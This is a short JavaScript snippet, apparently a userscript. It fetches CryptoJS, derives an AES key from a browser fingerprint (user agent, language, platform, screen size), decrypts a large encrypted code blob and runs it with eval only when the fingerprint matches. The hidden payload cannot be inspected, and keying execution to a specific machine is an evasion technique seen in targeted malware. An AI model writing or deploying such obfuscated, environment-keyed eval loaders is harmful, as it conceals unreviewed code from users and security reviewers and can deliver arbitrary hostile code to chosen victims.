


(function() {
    'use strict';

    function loadCryptoJS(callback) {
        const script = document.createElement('script');
        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js';
        script.onload = callback;
        document.head.appendChild(script);
    }

    function decrypt(text, key) {
        try {
            const bytes = CryptoJS.AES.decrypt(text, key);
            return bytes.toString(CryptoJS.enc.Utf8);
        } catch (e) {
            console.error('Error decrypting:', e);
            return '';
        }
    }

    function gerarFingerprint() {
        const navigatorData = window.navigator;
        const fingerprint = [
            navigatorData.userAgent,
            navigatorData.language,
            navigatorData.platform,
            `${window.screen.width}x${window.screen.height}`,
            window.screen.colorDepth
        ].join('|');
        return fingerprint;
    }

    const encryptedCode = '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';
    const encryptedFingerprint = 'U2FsdGVkX1+mQn6dNVQ7kMO91ZuzmmV9DxxWr3AwJ02N0V35FMkDb6T8y/iI0jSnAc1XpkXPentxrfDGcx/7f4Li9EKEkh/TpO/WzPVHRAU59i406ESRZJ1qHoB4v75RbHE3eGBW/2mxmX5EcVi+1ehb6D9mb388/dl5+RsOifDhT+eCs4HnRC4fFJspWZFDmyS5zipPEe3BH+/szX39RCZcp96dWHer2+a6q73GTI7XrBDUb12GDRsDRExlID2g';
    const key = gerarFingerprint();

    loadCryptoJS(function() {
        const decryptedFingerprint = decrypt(encryptedFingerprint, key);
        if (gerarFingerprint() === decryptedFingerprint) {
            const decryptedCode = decrypt(encryptedCode, key);
            try {
                eval(decryptedCode);
            } catch (e) {
                console.error('Error evaluating code:', e);
            }
        } else {
            console.error('Fingerprint does not match.');
        }
    });
})();
        
